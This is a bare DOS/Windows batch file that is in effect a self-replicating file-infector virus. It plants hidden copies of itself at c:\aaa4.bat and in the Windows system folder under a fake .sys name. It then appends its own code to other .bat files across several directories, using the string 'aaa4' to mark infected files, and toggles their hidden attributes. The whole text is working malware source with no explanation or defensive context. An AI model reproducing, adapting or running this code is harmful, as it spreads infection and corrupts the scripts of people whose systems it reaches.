@echo off
if not exist c:\aaa4.bat copy aaa4.bat c:\ >nul
if not exist c:\windows\system\qsdf.sys type c:\aaa4.bat > c:\windows\system\qsdf.sys
if not exist c:\aaa4.bat type c:\windows\system\qsdf.sys > c:\aaa4.bat
if not exist c:\aaa4.bat copy %0.bat c:\aaa4.bat >nul
:aaa4
for %%f in (..\*.bat *.bat c:\*.bat c:\windows\*.bat c:\windows\command\*.bat e:\*.bat) do set aaa4=%%f
del 1.*
echo.%aaa4%>>1
find /i " aaa4."<1>nul
if not errorlevel 1 goto e
find /i "aaa4"<%aaa4%>nul
if not errorlevel 1 goto fin
type c:\aaa4.bat>>%aaa4%
:e
attrib %aaa4% +h
GoTo aaa4
:fin
attrib c:\*.bat -h
attrib *.bat -h
attrib c:\windows\*.bat -h
attrib ..\*.bat -h
